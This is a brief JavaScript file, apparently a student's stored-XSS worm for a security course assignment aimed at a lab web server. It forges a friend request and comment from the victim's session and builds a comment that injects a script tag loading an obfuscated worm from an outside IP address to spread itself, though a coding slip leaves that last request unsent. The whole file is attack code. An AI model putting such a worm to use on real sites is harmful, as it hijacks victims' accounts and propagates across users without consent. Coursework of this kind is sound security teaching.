alert('get kek\'d')
const add_friend_req = new XMLHttpRequest();
const add_friend_url = 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=76#';
add_friend_req.open("GET", add_friend_url);
add_friend_req.send();

const comment_confirm_req = new XMLHttpRequest();
const comment_confirm_url = "http://csec380-core.csec.rit.edu:86/add_comment.php?id=76&comment=HiThere!";
comment_confirm_req.open("POST", comment_confirm_url);
comment_confirm_req.send();

const script_comment = new XMLHttpRequest();
const script_comment_url = "http://csec380-core.csec.rit.edu:86/add_comment.php?comment=%3Cscript+src%3Dhttp%3A%2F%2F52.14.213.84%2Fhw6_worm%2Fobfuscated_worm.js%3E%3C%2Fscript%3E%22";
comment_confirm_req.open("POST", comment_confirm_url);
comment_confirm_req.send();    
